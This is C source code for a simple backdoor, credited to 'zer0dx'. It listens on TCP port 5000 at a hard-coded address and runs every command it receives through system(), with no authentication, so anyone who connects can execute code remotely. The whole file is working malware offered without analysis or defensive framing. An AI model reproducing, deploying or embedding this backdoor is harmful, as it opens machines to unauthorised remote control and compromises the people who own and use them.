#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define AUTHOR "zer0dx"
#define VERSION "0.1"
#define SERVER_PORT 5000
#define SERVER_BACKLOG 2000
#define SERVER_ADDR "192.168.1.3"

int main(int argc, char *argv[]){

    struct sockaddr_in backdoor;
    struct sockaddr_in client;

    int sockfd, sockfd_client, bytes;
    char cmd[1024];

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        perror("socket");
        exit(1);
    }

    printf("[+]Successfully created socket\n");

    memset(&backdoor, 0, sizeof(backdoor));

    backdoor.sin_family = AF_INET;
    backdoor.sin_port = htons(SERVER_PORT);
    backdoor.sin_addr.s_addr = inet_addr(SERVER_ADDR);

    if(bind(sockfd, (struct sockaddr *)&backdoor, sizeof(struct sockaddr)) < 0){
        perror("bind");
        exit(1);
    }

    printf("[+]Bind successfully created\n");
 
    if(listen(sockfd, SERVER_BACKLOG)){
        perror("listen");
        exit(1);        
    }

    
    printf("[+]listening...\n");
    printf("[+]Server: %s\n", SERVER_ADDR);
    printf("[+]Port: %d\n", SERVER_PORT);
    

    while(1){
        int size = sizeof(struct sockaddr_in);
        
        if((sockfd_client = accept(sockfd, (struct sockaddr *) &client, &size)) < 0){
            perror("socket");
            exit(1);
        }

        memset(cmd, 0, sizeof(cmd));

        if((bytes = recv(sockfd_client, cmd, 50, 0)) < 0){
            perror("recv");
            exit(1);
        }

        cmd[bytes] = '\0';

        system(cmd);
    }

    return 0;

}
